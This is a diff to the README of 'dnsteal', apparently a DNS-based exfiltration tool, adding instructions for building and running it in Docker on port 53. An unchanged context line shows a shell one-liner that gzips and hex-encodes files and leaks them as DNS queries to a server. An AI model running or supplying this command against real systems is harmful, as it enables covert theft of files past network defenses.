@@ -38,4 +38,15 @@ or for multiple, gzip compressed files:
 for filename in $(ls); do for b in $(gzip -c $filename | xxd -p); do dig +short @server %b.$filename.com; done; done
 ```
 
-~x90
+
+**Using Docker**
+
+First build the image:
+```bash
+docker build -t dnsteal .
+```
+
+Run it as a daemon:
+```bash
+docker run -d -p 53:53 dnsteal
+```
